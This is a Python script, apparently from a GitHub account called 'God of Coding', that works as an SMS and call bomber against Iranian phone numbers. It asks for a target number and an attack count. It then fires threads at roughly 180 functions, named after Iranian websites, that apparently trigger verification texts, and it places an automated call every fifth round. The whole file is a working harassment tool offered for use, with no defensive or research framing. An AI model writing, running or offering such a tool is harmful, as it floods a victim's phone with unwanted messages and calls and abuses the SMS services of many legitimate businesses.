# God of Coding
# Github ===> https://github.com/GodOF-Coding
# Follow more codes on our GitHub .

# Required Libraries
from SmsBomberApi import sms , call # Using SmsBomberApi
from time import sleep              # Used for Loading bar and .......
from rich.console import Console    # Application beautification 
from rich.theme import Theme        # Application beautification - Build a theme
from rich.progress import Progress  # Application beautification - Build Progress
from rich.markdown import Markdown  # Application beautification - Build a header
from rich.traceback import install  # Application beautification - Beautifying errors
from threading import Thread       
from sys import exit                
from os import system, name         
from random import choice           
from inspect import getmembers, isfunction 
# End Required Libraries

install() # Beautifying errors

# Theme Custom 
ThemeCustom = Theme({"star": "#2980B9" , "dash" : "#E8452F" , "text": "bold #1ABC9C" , "number": "#9B59B6" , "example" : "bold #F39C12" })


# Header ==> Start and Finish
MARKDOWN_S = """# Start SMSBomber"""
MARKDOWN_F = """# Finish SMSBomber"""

def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(0.01)


Sms_Sent  = len(getmembers(sms , isfunction))   # The number of sms sending sites
Call_Sent = len(getmembers(call, isfunction)) # The number of call sending sites

def SMSBomber( phone , Send ):
    
    console = Console( theme = ThemeCustom ) # Theme Custom 
    phone = f"+98{phone[1::]}"
    count = 1
    while count <= Send:
        # Start sending sms
        Thread(target=sms.a4baz, args=[phone]).start()        
        Thread(target=sms.gharar, args=[phone]).start()
        Thread(target=sms.abantether, args=[phone]).start()
        Thread(target=sms.achar, args=[phone]).start()
        Thread(target=sms.alibaba, args=[phone]).start()
        Thread(target=sms.alinance, args=[phone]).start()
        Thread(target=sms.alopeyk, args=[phone]).start()
        Thread(target=sms.alopeyk_safir, args=[phone]).start()
        Thread(target=sms.amoomilad, args=[phone]).start()
        Thread(target=sms.anar, args=[phone]).start()
        Thread(target=sms.arka, args=[phone]).start()
        Thread(target=sms.arshiyan, args=[phone]).start()
        Thread(target=sms.ashraafi, args=[phone]).start()
        Thread(target=sms.azki, args=[phone]).start()
        Thread(target=sms.bahram_shop, args=[phone]).start()
        Thread(target=sms.balad, args=[phone]).start()
        Thread(target=sms.bama, args=[phone]).start()
        Thread(target=sms.banankala, args=[phone]).start()
        Thread(target=sms.bandarazad, args=[phone]).start()
        Thread(target=sms.banimode, args=[phone]).start()
        Thread(target=sms.basalam, args=[phone]).start()
        Thread(target=sms.baskol, args=[phone]).start()
        Thread(target=sms.bazidone, args=[phone]).start()
        Thread(target=sms.beheshticarpet, args=[phone]).start()
        Thread(target=sms.bigtoys, args=[phone]).start()
        Thread(target=sms.bimito, args=[phone]).start()
        Thread(target=sms.binjo, args=[phone]).start()
        Thread(target=sms.bit24, args=[phone]).start()
        Thread(target=sms.bitex24, args=[phone]).start()
        Thread(target=sms.candoosms, args=[phone]).start()
        Thread(target=sms.chamedoon, args=[phone]).start()
        Thread(target=sms.chaymarket, args=[phone]).start()
        Thread(target=sms.cinematicket, args=[phone]).start()
        Thread(target=sms.coffefastfoodluxury, args=[phone]).start()
        Thread(target=sms.dadhesab, args=[phone]).start()
        Thread(target=sms.dadpardaz, args=[phone]).start()
        Thread(target=sms.dastkhat, args=[phone]).start()
        Thread(target=sms.delino, args=[phone]).start()
        Thread(target=sms.devslop, args=[phone]).start()
        Thread(target=sms.deyfriedchicken, args=[phone]).start()
        Thread(target=sms.dicardo, args=[phone]).start()
        Thread(target=sms.didnegar, args=[phone]).start()
        Thread(target=sms.digikala, args=[phone]).start()
        Thread(target=sms.digikalajet, args=[phone]).start()
        Thread(target=sms.digipay, args=[phone]).start()
        Thread(target=sms.digistyle, args=[phone]).start()
        Thread(target=sms.divar, args=[phone]).start()
        Thread(target=sms.doctor, args=[phone]).start()
        Thread(target=sms.doctoreto, args=[phone]).start()
        Thread(target=sms.donergarden, args=[phone]).start()
        Thread(target=sms.dosma, args=[phone]).start()
        Thread(target=sms.drdr, args=[phone]).start()
        Thread(target=sms.drsaina, args=[phone]).start()
        Thread(target=sms.ehteraman, args=[phone]).start()
        Thread(target=sms.emtiaz, args=[phone]).start()
        Thread(target=sms.exo, args=[phone]).start()
        Thread(target=sms.express, args=[phone]).start()
        Thread(target=sms.farsgraphic, args=[phone]).start()
        Thread(target=sms.filmnet, args=[phone]).start()
        Thread(target=sms.flightio, args=[phone]).start()
        Thread(target=sms.foodbell, args=[phone]).start()
        Thread(target=sms.foodcenter, args=[phone]).start()
        Thread(target=sms.foodiran16, args=[phone]).start()
        Thread(target=sms.foodlandkish, args=[phone]).start()
        Thread(target=sms.gap, args=[phone]).start()
        Thread(target=sms.gapfilm, args=[phone]).start()
        Thread(target=sms.garcon, args=[phone]).start()
        Thread(target=sms.gelatohouse, args=[phone]).start()
        Thread(target=sms.ghabzino, args=[phone]).start()
        Thread(target=sms.ghasedak24, args=[phone]).start()
        Thread(target=sms.givernfood, args=[phone]).start()
        Thread(target=sms.glite, args=[phone]).start()
        Thread(target=sms.hamlex, args=[phone]).start()
        Thread(target=sms.hamrahbours, args=[phone]).start()
        Thread(target=sms.helsa, args=[phone]).start()
        Thread(target=sms.hemat, args=[phone]).start()
        Thread(target=sms.hiword, args=[phone]).start()
        Thread(target=sms.homtick, args=[phone]).start()
        Thread(target=sms.hyperjan, args=[phone]).start()
        Thread(target=sms.instagram, args=[phone]).start()
        Thread(target=sms.iranamlaak, args=[phone]).start()
        Thread(target=sms.iranicard, args=[phone]).start()
        Thread(target=sms.iranketab, args=[phone]).start()
        Thread(target=sms.irantic, args=[phone]).start()
        Thread(target=sms.irwco, args=[phone]).start()
        Thread(target=sms.itoll, args=[phone]).start()
        Thread(target=sms.kafegheymat, args=[phone]).start()
        Thread(target=sms.karchidari, args=[phone]).start()
        Thread(target=sms.kardoon, args=[phone]).start()
        Thread(target=sms.ketabchi, args=[phone]).start()
        Thread(target=sms.khanoumi, args=[phone]).start()
        Thread(target=sms.khodro45, args=[phone]).start()
        Thread(target=sms.kilid, args=[phone]).start()
        Thread(target=sms.kodakamoz, args=[phone]).start()
        Thread(target=sms.lendo, args=[phone]).start()
        Thread(target=sms.limome, args=[phone]).start()
        Thread(target=sms.mahiyekhoob, args=[phone]).start()
        Thread(target=sms.mamifood, args=[phone]).start()
        Thread(target=sms.mashinbank, args=[phone]).start()
        Thread(target=sms.mazoo, args=[phone]).start()
        Thread(target=sms.mci, args=[phone]).start()
        Thread(target=sms.mek, args=[phone]).start()
        Thread(target=sms.melix, args=[phone]).start()
        Thread(target=sms.miare, args=[phone]).start()
        Thread(target=sms.mihanpezeshk, args=[phone]).start()
        Thread(target=sms.mipersia, args=[phone]).start()
        Thread(target=sms.mobogift, args=[phone]).start()
        Thread(target=sms.moshaveran724, args=[phone]).start()
        Thread(target=sms.namava, args=[phone]).start()
        Thread(target=sms.nesengrill, args=[phone]).start()
        Thread(target=sms.nobat, args=[phone]).start()
        Thread(target=sms.novinbook, args=[phone]).start()
        Thread(target=sms.offch, args=[phone]).start()
        Thread(target=sms.offdecor, args=[phone]).start()
        Thread(target=sms.okcs, args=[phone]).start()
        Thread(target=sms.okorosh, args=[phone]).start()
        Thread(target=sms.olgoo, args=[phone]).start()
        Thread(target=sms.opco, args=[phone]).start()
        Thread(target=sms.ostadkr, args=[phone]).start()
        Thread(target=sms.otaghak, args=[phone]).start()
        Thread(target=sms.pakhsh, args=[phone]).start()
        Thread(target=sms.paklean, args=[phone]).start()
        Thread(target=sms.paymishe, args=[phone]).start()
        Thread(target=sms.pezeshket, args=[phone]).start()
        Thread(target=sms.pinket, args=[phone]).start()
        Thread(target=sms.pirankalaco, args=[phone]).start()
        Thread(target=sms.pizzapanjereh, args=[phone]).start()
        Thread(target=sms.podro, args=[phone]).start()
        Thread(target=sms.pubgsell, args=[phone]).start()
        Thread(target=sms.pubisha, args=[phone]).start()
        Thread(target=sms.raminashop, args=[phone]).start()
        Thread(target=sms.rayshomar, args=[phone]).start()
        Thread(target=sms.refahtea, args=[phone]).start()
        Thread(target=sms.rojashop, args=[phone]).start()
        Thread(target=sms.rokla, args=[phone]).start()
        Thread(target=sms.rubika, args=[phone]).start()
        Thread(target=sms.sTrip, args=[phone]).start()
        Thread(target=sms.sabziman, args=[phone]).start()
        Thread(target=sms.safiran, args=[phone]).start()
        Thread(target=sms.see5, args=[phone]).start()
        Thread(target=sms.seebirani, args=[phone]).start()
        Thread(target=sms.shab, args=[phone]).start()
        Thread(target=sms.shad, args=[phone]).start()
        Thread(target=sms.shahrfarsh, args=[phone]).start()
        Thread(target=sms.shahrhayejadid, args=[phone]).start()
        Thread(target=sms.shandiz, args=[phone]).start()
        Thread(target=sms.sheypoor, args=[phone]).start()
        Thread(target=sms.shop_mci, args=[phone]).start()
        Thread(target=sms.sibbank, args=[phone]).start()
        Thread(target=sms.sibbazar, args=[phone]).start()
        Thread(target=sms.simkhanF, args=[phone]).start()
        Thread(target=sms.simkhanT, args=[phone]).start()
        Thread(target=sms.sizdah50, args=[phone]).start()
        Thread(target=sms.smarket, args=[phone]).start()
        Thread(target=sms.snap, args=[phone]).start()
        Thread(target=sms.snapfood, args=[phone]).start()
        Thread(target=sms.snapp, args=[phone]).start()
        Thread(target=sms.snapp_drivers, args=[phone]).start()
        Thread(target=sms.snapp_link, args=[phone]).start()
        Thread(target=sms.steelalborz, args=[phone]).start()
        Thread(target=sms.taghche, args=[phone]).start()
        Thread(target=sms.tajtehran, args=[phone]).start()
        Thread(target=sms.takfarsh, args=[phone]).start()
        Thread(target=sms.tamland, args=[phone]).start()
        Thread(target=sms.tap30, args=[phone]).start()
        Thread(target=sms.tapsi, args=[phone]).start()
        Thread(target=sms.tikban, args=[phone]).start()
        Thread(target=sms.timcheh, args=[phone]).start()
        Thread(target=sms.tj8, args=[phone]).start()
        Thread(target=sms.tmg, args=[phone]).start()
        Thread(target=sms.tnovin, args=[phone]).start()
        Thread(target=sms.topnoor, args=[phone]).start()
        Thread(target=sms.torob, args=[phone]).start()
        Thread(target=sms.uphone, args=[phone]).start()
        Thread(target=sms.virgool, args=[phone]).start()
        Thread(target=sms.watchonline, args=[phone]).start()
        Thread(target=sms.wis, args=[phone]).start()
        Thread(target=sms.zerocafe, args=[phone]).start()
        Thread(target=sms.zivanpet, args=[phone]).start()
        # End of sending sms
        
        # status sent 
        console.print(f"[dash][[/dash][number] {count} [/number][dash]][/dash][dash] - [/dash][text]Sending wassuccessful[/text][dash] . [/dash]")
        
        if (count % 5) == 0:
           rnd_call = choice([call.ragham_call,call.paklean_call,call.novinbook_call,call.azki_call]) 
           Thread(target=rnd_call, args=[phone]).start() # sending call
           
        count += 1
        sleep(0.2)
        
    console.print(Markdown(MARKDOWN_F)) # Header ==> Finish
    exit()

if __name__ == "__main__":
    
    console = Console(theme=ThemeCustom) # Theme Custom 
    
    console.rule("[#E74C3C]Sms Bomber")  
    
    # Write about the sms bomber
    console.print(f"[dash] - [/dash][text] The number of sms sent [/text][dash]:[/dash][number] {Sms_Sent}  [number] [dash] - [/dash][text]The number of call sent [/text][dash]:[/dash][number] {Call_Sent}[number]" , justify="center")
    
    # Getting the target phone number
    Phone_Number = console.input("[star] + [/star][text]Enter the target phone number ([/text] [example]09013000000 [/example][text])[/text]\n [dash]-> [/dash]")
    
    # Get the attack count
    Number_Sent = int(console.input("[star] + [/star][text]Enter the number of sms sent ([/text] [example]0 or 200 [/example][text])[/text]\n [dash]-> [/dash]"))
    
    console.print("[cyan]loading...",justify="center")
    with Progress() as progress: # Loading bar
        task3 = progress.add_task("[#E8452F]    ====>",total=1000,) 
        while not progress.finished:
            progress.update(task3, advance=1)
            sleep(0.002)
            
    system('clear' if name == 'posix' else 'cls')
    
    console.print(Markdown(MARKDOWN_S)) # Header ==> Start
    
    # Attack information
    console.print(f"[dash] - [/dash][text]Phone Number[/text][dash] : [/dash][number]{Phone_Number}[number] [dash] - [/dash][text] Sms Sent [/text][dash]:[/dash][number] {Number_Sent}[/number]\n",justify="center")

    SMSBomber(phone=Phone_Number,Send=Number_Sent)